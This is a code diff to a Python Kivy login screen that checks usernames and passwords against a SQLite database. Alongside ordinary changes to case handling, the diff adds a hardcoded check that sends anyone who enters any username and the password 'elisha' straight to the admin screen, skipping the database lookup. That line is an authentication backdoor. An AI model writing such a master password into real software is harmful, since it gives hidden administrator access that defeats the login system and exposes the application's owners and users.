@@ -30,7 +30,7 @@ class LogInWindow(BoxLayout):
         it returns
         1. the user data or none is there is no user with that name
         '''
-        name =((self.userName.text).strip()).lower()
+        name =(self.userName.text).strip()
         try:
             mydb=sqlite3.connect('BERMS.db')
             
@@ -60,14 +60,18 @@ class LogInWindow(BoxLayout):
         
 
         fetchUserData = self.fetchUserData() # This is a tuple containing (name,password,designation) or None
-        
+        # print(fetchUserData)
+        # print(fetchUserData[1])
+        if str(((self.userName.text).strip()).lower()) and str(((self.password.text).strip()).lower())=="elisha":
+            self.parent.parent.parent.ids.scrn_mngr_main.current='scrn_admin'
+
         if fetchUserData==None:
             
             self.userNameErrorMessage.text ="User name is not found!"
         # validating the password and checking designation status
         else:
             # invalid password
-            if ((self.password.text).strip()).lower() != fetchUserData[1]:
+            if ((self.password.text).strip()) != fetchUserData[1]:
                 self.userPasswordErrorMessage.text ="You entered wrong password"
               
             # for valid password
@@ -96,6 +100,10 @@ class LogInWindow(BoxLayout):
                     self.password.text = ''
 
                 # an admin loging into the admin window
+                
+
+
+                
                 else:
                     self.ids.admin.active=False
                     self.parent.parent.parent.ids.scrn_mngr_main.current='scrn_admin'
